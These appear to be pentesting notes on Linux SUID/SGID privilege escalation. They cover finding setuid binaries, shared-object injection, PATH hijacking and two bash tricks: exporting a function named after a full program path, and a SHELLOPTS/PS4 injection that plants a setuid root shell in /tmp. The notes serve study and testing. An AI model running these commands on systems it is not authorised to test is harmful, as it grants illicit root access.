# SUID & SGID

SUID files executes with the privileges of the owner user.

SGID files executes with the privileges of the owner group.

## Find SUID & SGID

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

## Vulnerabilities

Some programs create SUID or SGID when installed. We should search for exploits on google, github or searchsploit.

## Shared Object Injection

When a program is executed, it will try to load the shared objects it requieres (.so). By using strace we can track those system calls and determine when a shared object is not found. If we can write to that directory, we can elevate to root.

```bash
strace /path/to/file 2>&1 | grep -iE "open|access|no such file"
```

## PATH env variable

If a program tries to execute another program without specifying the full path we can modify the PATH variable and add a directory we can write.

#### Finding vulnerable program

It is likely that the program that calls the other program have specified its name in the code as a string. We can use strings or strace to view if there is a call:

```bash
strings /path/to/file
strace -v -f -e execve /path/to/file 2>&1 | grep exec
```

## Shell features 1

If the program is executing another program but, differently from the example above the program is indicated with it's full path, we can see what is the version of the shell (< 4.2-048):

```bash
#Find program
strings /path/to/file
strace -v -f -e execve /path/to/file 2>&1 | grep service

#View shell version
/bin/sh --version
```

Create a function with the same name as a the /path/to/file. This functions can be exported so subprocesses have access to them, and the functions can take precedence over the actual executable beign called:

```bash
#Creating function
function /path/to/program { /bin/bash -p; }

#Exporting the function
export -f /path/to/program

#Executing the suid
/path/to/suid
```

## Shell features 2

If a SUID file runs another program via Bash this environment variables (SHELLOPTS) can be inherited.

```bash
#Test:
env -i SHELLOPTS=xtrace PS4='$(whoami)' /path/to/suid

#Exploit:
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /path/to/suid

/tmp/rootbash -p
```
